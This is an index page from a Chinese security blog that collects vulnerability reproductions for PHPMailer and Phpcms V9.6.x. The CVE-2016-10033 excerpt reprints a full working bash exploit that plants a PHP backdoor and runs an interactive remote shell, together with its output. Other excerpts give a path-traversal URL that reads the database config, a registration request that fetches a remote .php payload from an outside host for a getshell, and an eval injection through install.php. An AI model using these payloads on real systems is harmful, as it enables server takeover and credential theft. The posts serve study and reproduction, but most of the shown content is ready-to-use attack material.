<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/51/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-PHPMailer/（CVE-2017-5223）PHPMailer _= 5.2.21 任意文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PHPMailer/%EF%BC%88CVE-2017-5223%EF%BC%89PHPMailer%20_=%205.2.21%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:02.006Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-5223）PHPMailer-lt-5-2-21-任意文件读取漏洞"><a href="#（CVE-2017-5223）PHPMailer-lt-5-2-21-任意文件读取漏洞" class="headerlink" title="（CVE-2017-5223）PHPMailer &lt;= 5.2.21 任意文件读取漏洞"></a>（CVE-2017-5223）PHPMailer &lt;= 5.2.21 任意文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<code>），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用</code>将文件<code>/etc/passwd</code>作为附件读取出来，造成任意文件读取漏洞。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPMailer &lt;= 5.2.21</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>“意见反馈”页面，正常用户填写昵称、邮箱、意见提交，这些信息将被后端储存，同时后端会发送一封邮件提示用户意见填写完成：</p>
<p><img src="/resource/(CVE-2017-5223)PHPMailer%3C=5.2.21%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
<blockquote>
<p>该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码``，目标服务器上的文件将以附件的形式被读取出来。</p>
</blockquote>
<p>同样，我们填写恶意代码在”意见”的位置：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/PHPMailer/%EF%BC%88CVE-2017-5223%EF%BC%89PHPMailer%20_=%205.2.21%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PHPMailer/%EF%BC%88CVE-2017-5223%EF%BC%89PHPMailer%20_=%205.2.21%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quax00emy8v10ijbflog" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-PHPMailer/（CVE-2016-10033）PHPMailer _ 5.2.18 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/PHPMailer/%EF%BC%88CVE-2016-10033%EF%BC%89PHPMailer%20_%205.2.18%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:02.004Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2016-10033）PHPMailer-lt-5-2-18-远程命令执行漏洞"><a href="#（CVE-2016-10033）PHPMailer-lt-5-2-18-远程命令执行漏洞" class="headerlink" title="（CVE-2016-10033）PHPMailer &lt; 5.2.18 远程命令执行漏洞"></a>（CVE-2016-10033）PHPMailer &lt; 5.2.18 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PHPMailer<br>5.2.18之前的版本存在一个漏洞，该漏洞可能导致远程代码执行（RCE）。如果未设置Sender属性，则PHPMailer的isMail传输中的mailSend函数可能会允许远程攻击者将额外的参数传递给mail命令，从而通过在预制的发件人地址中使用”（反斜杠双引号）执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPMailer &lt; 5.2.18</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>root@kali:~/CVE-2016-10033# ./exploit.sh www.0-sec.org:8080
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting www.0-sec.org:8080
[+] Target exploited, acessing shell at http://www.0-sec.org:8080/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Running whoami
www-data
RemoteShell&gt; ls
[+] Running ls
vulnerable
RemoteShell&gt; pwd
[+] Running pwd
/www
CVE-2016-10033.sh
#!/bin/bash
# CVE-2016-10033 exploit by opsxcq
# https://github.com/opsxcq/exploit-CVE-2016-10033

echo &#39;[+] CVE-2016-10033 exploit by opsxcq&#39;

if [ -z &quot;$1&quot; ]
then
    echo &#39;[-] Please inform an host as parameter&#39;
    exit -1
fi

if [ $(uname) == &#39;Darwin&#39; ]
then
    decoder=&#39;base64 -D&#39;
elif [ $(uname) == &#39;Linux&#39; ]
then
    decoder=&#39;base64 -d&#39;  
else
    echo &#39;[-] Your platform isnt supported: &#39;$(uname)
    exit -1
fi


host=$1

echo &#39;[+] Exploiting &#39;$host

curl -sq &#39;http://&#39;$host -H &#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe&#39; --data-binary $&#39;------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;action&quot;\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;name&quot;\r\n\r\n&lt;?php echo &quot;|&quot;.base64_encode(system(base64_decode($_GET[&quot;cmd&quot;]))).&quot;|&quot;; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;email&quot;\r\n\r\n\&quot;vulnerables\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;message&quot;\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n&#39; &gt;/dev/null &amp;&amp; echo &#39;[+] Target exploited, acessing shell at http://&#39;$host&#39;/backdoor.php&#39;


echo &#39;[+] Checking if the backdoor was created on target system&#39;
code=$(curl -o /dev/null --silent --head --write-out &#39;%&#123;http_code&#125;\n&#39; &quot;http://$host/backdoor.php&quot;)

if [ &quot;$code&quot; != &quot;200&quot; ]
then
    echo &#39;[-] Target cant be exploited&#39;
    exit -1
else
    echo &#39;[+] Backdoor.php found on remote system&#39;
fi

cmd=&#39;whoami&#39;
while [ &quot;$cmd&quot; != &#39;exit&#39; ]
do
    echo &#39;[+] Running &#39;$cmd
    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep &#39;|&#39; | grep -v &#39;base64_encode&#39; | head -n 1 | cut -d &#39;|&#39; -f 2 | $decoder 
    then
        echo &#39;[-] Connection problens&#39;
        exit -1
    fi
    echo
    read -p &#39;RemoteShell&gt; &#39; cmd
done
echo &#39;[+] Exiting&#39;
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/PHPMailer/%EF%BC%88CVE-2016-10033%EF%BC%89PHPMailer%20_%205.2.18%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PHPMailer/%EF%BC%88CVE-2016-10033%EF%BC%89PHPMailer%20_%205.2.18%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quax00ely8v1flmpemz4" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:01.749Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-19127）Phpcms2008-Type-php代码注入漏洞"><a href="#（CVE-2018-19127）Phpcms2008-Type-php代码注入漏洞" class="headerlink" title="（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞"></a>（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>PHPCMS<br>2008存在的代码注入漏洞，导致攻击者可向网站上路径可控的缓存文件写入任意内容，从而可能获取webshell并执行任意指令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞源于PHPCMS 2008源码中的/type.php文件。该文件包含如下代码：</p>
<pre><code>if(empty($template)) $template = &#39;type&#39;;
...
include template(&#39;phpcms&#39;, $template);
</code></pre>
<p>这里$template变量是用户能够通过传入参数控制的，同时可以看到该变量之后会被传入template()方法。而template()方法在/include/global.func.php文件中定义，包含如下代码：</p>
<pre><code>template_compile($module, $template, $istag);
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu2j00dry8v103cf0fih" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms V9.6.3 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:01.747Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-V9-6-3-文件包含漏洞"><a href="#Phpcms-V9-6-3-文件包含漏洞" class="headerlink" title="Phpcms V9.6.3 文件包含漏洞"></a>Phpcms V9.6.3 文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><code>http://www.0-sec.org/m=search&amp;a=public_get_suggest_keyword&amp;q=../../phpsso_server/caches/configs/database.php </code></p>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu5v00e7y8v18au77bvn" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms V9.6.3 后台远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:01.744Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-V9-6-3-后台远程命令执行漏洞"><a href="#Phpcms-V9-6-3-后台远程命令执行漏洞" class="headerlink" title="Phpcms V9.6.3 后台远程命令执行漏洞"></a>Phpcms V9.6.3 后台远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞代码位于 <code>/phpcms/modules/admin/menu.php</code> 第 81 行</p>
<pre><code>function edit() &#123;
    if(isset($_POST[&#39;dosubmit&#39;])) &#123;
        $id = intval($_POST[&#39;id&#39;]);
        //print_r($_POST[&#39;info&#39;]);exit;
        $r = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));
        $this-&gt;db-&gt;update($_POST[&#39;info&#39;],array(&#39;id&#39;=&gt;$id));
        //修改语言文件
        $file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;;
        require $file;
        $key = $_POST[&#39;info&#39;][&#39;name&#39;];
        if(!isset($LANG[$key])) &#123;
            $content = file_get_contents($file);
            $content = substr($content,0,-2);
            $data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;
            file_put_contents($file,$data);
        &#125; elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) &#123;
            $content = file_get_contents($file);
            $content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content);
            file_put_contents($file,$content);
        &#125;
        $this-&gt;update_menu_models($id, $r, $_POST[&#39;info&#39;]);          
        //结束语言文件修改
        showmessage(L(&#39;operation_success&#39;));
    &#125; else &#123;

    .  .  .   .  .  .  

    &#125;
&#125;
</code></pre>
<p>这段代码是修改语言文件用的，而这个语言文件就是<br>/phpcms/languages/zh-cn/system_menu.lang.php</p>
<p>里面一堆类似 <code>$LANG[&#39;video&#39;] = &#39;视频&#39;;</code> 的东西</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu5w00e8y8v16do3ef2a" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms V9.6.3 前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="article-date">
  <time datetime="2022-07-08T06:26:01.741Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-V9-6-3-前台getshell"><a href="#Phpcms-V9-6-3-前台getshell" class="headerlink" title="Phpcms V9.6.3 前台getshell"></a>Phpcms V9.6.3 前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1
Host: www.0-sec.org
Content-Length: 297
Cache-Control: max-age=0
Origin: http://www.0-sec.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,es;q=0.6,fr;q=0.4,vi;q=0.2
Cookie: PHPSESSID=h5jo0216vveqr9blnh146tq5q5
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
Connection: close

siteid=1&amp;modelid=2&amp;username=520520&amp;password=5205201&amp;pwdconfirm=5205201&amp;email=52052096%40163.com&amp;nickname=52096&amp;dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&amp;protocol=&amp;info[content]=&lt;img src=http://wwww.0-sec.org/xxx.txt?.php#.jpg&gt;
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2qu5v00e6y8v1ggumfayd" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms V9.6.3 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
  <time datetime="2022-07-08T06:26:01.739Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-V9-6-3-储存型xss"><a href="#Phpcms-V9-6-3-储存型xss" class="headerlink" title="Phpcms V9.6.3 储存型xss"></a>Phpcms V9.6.3 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>问题出在会员的积分兑换功能，文件：</p>
<pre><code>/phpcms/modules/member/index.php
 public function change_credit() &#123;
  $memberinfo = $this-&gt;memberinfo;
  //加载用户模块配置
  $member_setting = getcache(&#39;member_setting&#39;);
  $this-&gt;_init_phpsso();
  $setting = $this-&gt;client-&gt;ps_getcreditlist();
  $outcredit = unserialize($setting);
  $setting = $this-&gt;client-&gt;ps_getapplist();
  $applist = unserialize($setting);

  if(isset($_POST[&#39;dosubmit&#39;])) &#123;
   //本系统积分兑换数
   $fromvalue = intval($_POST[&#39;fromvalue&#39;]);
   //本系统积分类型
   $from = $_POST[&#39;from&#39;];
   $toappid_to = explode(&#39;_&#39;, $_POST[&#39;to&#39;]);      //这个是问题的参数
   //目标系统appid
   $toappid = $toappid_to[0];
   //目标系统积分类型
   $to = $toappid_to[1];
   if($from == 1) &#123;
    if($memberinfo[&#39;point&#39;] &lt; $fromvalue) &#123;
     showmessage(L(&#39;need_more_point&#39;), HTTP_REFERER);
    &#125;
   &#125; elseif($from == 2) &#123;
    if($memberinfo[&#39;amount&#39;] &lt; $fromvalue) &#123;
     showmessage(L(&#39;need_more_amount&#39;), HTTP_REFERER);
    &#125;
   &#125; else &#123;
    showmessage(L(&#39;credit_setting_error&#39;), HTTP_REFERER);
   &#125;

   $status = $this-&gt;client-&gt;ps_changecredit($memberinfo[&#39;phpssouid&#39;], $from, $toappid, $to, $fromvalue);
</code></pre>
<p>这里有个问题，由于<code>if($memberinfo[&#39;point&#39;] &lt; $fromvalue)</code>所以，<code>$fromvalue</code>不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有<code>intval($fromvalue)</code>，所以我们可以<code>$fromvalue=0.9</code>经过<code>intval</code>后就成了<code>0</code>，也就绕过了上面的逻辑。跟进<code>ps_changecredit</code>函数：</p>
<pre><code>public function ps_changecredit($uid, $from, $toappid, $to, $credit) &#123;
  return $this-&gt;_ps_send(&#39;changecredit&#39;, array(&#39;uid&#39;=&gt;$uid, &#39;from&#39;=&gt;$from, &#39;toappid&#39;=&gt;$toappid, &#39;to&#39;=&gt;$to, &#39;credit&#39;=&gt;$credit));
 &#125;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qu5u00e5y8v12f0gbggy" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms V9.6.3 install.php 没有即使删除导致的getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="article-date">
  <time datetime="2022-07-08T06:26:01.737Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Phpcms-V9-6-3-install-php-没有即使删除导致的getshell"><a href="#Phpcms-V9-6-3-install-php-没有即使删除导致的getshell" class="headerlink" title="Phpcms V9.6.3 install.php 没有即使删除导致的getshell"></a>Phpcms V9.6.3 install.php 没有即使删除导致的getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>比较鸡肋，需要在环境安装好了之后，install.php也没有被删除，才可以利用</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms &lt; V9.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /install/install.php?step=installmodule
module=admin&amp;dbport=3306&amp;pconnect=eval($_GET[&quot;a&quot;])
</code></pre>
<blockquote>
<p>这里控制的是<br>pconnect参数，因为默认它没有单引号比较好调试。注意这里如果不传dbport参数的话database.php里的port参数会置空，将会报错。就无法执行到后面的<br>eval了</p>
</blockquote>
<p><img src="/resource/PhpcmsV9.6.3install.php%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/media/rId24.png" alt="1.png"></p>
<p>被修改后的database.php：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" data-id="cl5c2qu5u00e4y8v1hw7298wo" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Phpcms/Phpcms v9.6.2 前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:26:01.734Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
